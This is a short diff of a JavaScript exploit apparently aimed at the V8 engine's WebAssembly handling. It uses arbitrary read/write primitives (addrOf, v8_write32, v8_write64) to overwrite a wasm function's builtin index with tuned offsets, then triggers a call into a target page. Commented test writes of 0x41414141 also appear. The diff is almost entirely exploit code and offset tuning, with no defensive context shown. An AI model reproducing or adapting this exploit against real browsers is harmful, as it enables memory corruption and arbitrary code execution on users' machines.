@@ -58,6 +58,7 @@ builder.addFunction("func1", builder.addType(kSig_l_l)).exportFunc().addBody([ /
 let instance = builder.instantiate();
 
 instance.exports.func1(0n);
+// eval("")
 
 %DebugPrint(instance.exports.func1);
 // ===============================
@@ -68,10 +69,20 @@ console.log("0x" + id_builtins_function.toString(16));
 
 // 0xfc - Builtins_MathLog
 //  Command failed with offset 0x4f
-v8_write32(BigInt(addrOf(instance.exports.func1)+0xb+1), id_builtins_function - 0x336*0x200);
+// 0x336: Builtins_FulfillPromise
+// 0x14a6
+// 0x15fc-0x144f
+// 0x12d4
+// 1027
+// 0x2000 -> call jit
+// v8_write32(BigInt(addrOf(instance.exports.func1)+0xb+1), id_builtins_function - (0x15fc-0x1161)*0x200);
+v8_write32(BigInt(addrOf(instance.exports.func1)+0xb+1), id_builtins_function - (0x15fc-0x1035)*0x200);
 console.log("0x" + v8_read32(addrOf(instance.exports.func1)+0xb+1).toString(16));
 
+// 
+// v8_write32(0x1f0000n, 0x41414141);
+// v8_write64(0x200145n - 1n, 0x4141414142424242n);
 
 // trigger
-instance.exports.func1(Number(target_page));
+instance.exports.func1(Number(target_page+1n));
 
